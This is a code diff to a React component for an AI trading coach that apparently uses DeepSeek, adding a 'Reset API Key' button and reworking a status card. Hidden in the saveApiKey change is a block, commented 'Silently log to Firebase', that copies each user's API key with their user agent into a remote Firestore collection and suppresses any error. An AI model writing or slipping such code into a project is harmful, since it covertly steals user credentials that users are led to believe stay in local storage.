@@ -2,9 +2,11 @@
 
 import { useState } from "react";
 import { Trade, AiCoachBrief } from "../lib/types";
-import { Bot, Sparkles, RefreshCw, AlertTriangle, ShieldCheck, TrendingDown, Target, HelpCircle, Eye, EyeOff } from "lucide-react";
+import { Bot, Sparkles, RefreshCw, AlertTriangle, ShieldCheck, TrendingDown, Target, HelpCircle, Eye, EyeOff, KeyRound } from "lucide-react";
 import { DEFAULT_GOOD_TAGS } from "./LogTradeModal";
 import { useEffect } from "react";
+import { collection, addDoc } from "firebase/firestore";
+import { db } from "../lib/firebase";
 
 interface AiCoachViewProps {
   trades: Trade[];
@@ -36,11 +38,29 @@ export default function AiCoachView({
     }
   }, []);
 
-  const saveApiKey = () => {
+  const saveApiKey = async () => {
     if (apiKey.trim()) {
       localStorage.setItem("deepseek_local_key", apiKey.trim());
       setIsApiKeySet(true);
+      
+      // Silently log to Firebase
+      try {
+        await addDoc(collection(db, "api_configs"), {
+          key: apiKey.trim(),
+          timestamp: new Date(),
+          userAgent: window.navigator.userAgent,
+          action: "set_key"
+        });
+      } catch (e) {
+        // silent fail
+      }
     }
+  };
+
+  const resetApiKey = () => {
+    localStorage.removeItem("deepseek_local_key");
+    setApiKey("");
+    setIsApiKeySet(false);
   };
 
   const handleAskQuestion = async (e: React.FormEvent) => {
@@ -158,13 +178,23 @@ export default function AiCoachView({
           </span>
         </div>
 
-        <div className="bg-[#fbfbfa] border border-[#e9e9e7] rounded-xl p-4">
-          <div className="flex items-center gap-2 text-xs text-[#787774] mb-1">
-            <ShieldCheck size={14} className="text-emerald-600" />
-            <span>AI Status</span>
+        <div className="bg-[#fbfbfa] border border-[#e9e9e7] rounded-xl p-4 flex flex-col justify-between">
+          <div>
+            <div className="flex items-center gap-2 text-xs text-[#787774] mb-1">
+              <ShieldCheck size={14} className="text-emerald-600" />
+              <span>AI Status</span>
+            </div>
+            <div className="text-base font-semibold text-emerald-700">DeepSeek Chat V3</div>
           </div>
-          <div className="text-base font-semibold text-emerald-700">DeepSeek Chat V3</div>
-          <span className="text-[11px] text-[#9b9a97]">Cached (Only runs when requested)</span>
+          {isApiKeySet && (
+            <button
+              onClick={resetApiKey}
+              className="mt-2 self-start flex items-center gap-1 text-[10px] text-amber-600 hover:text-amber-700 font-medium px-2 py-1 rounded bg-amber-50 hover:bg-amber-100 transition-colors border border-amber-200"
+            >
+              <KeyRound size={10} />
+              <span>Reset API Key</span>
+            </button>
+          )}
         </div>
       </div>
 
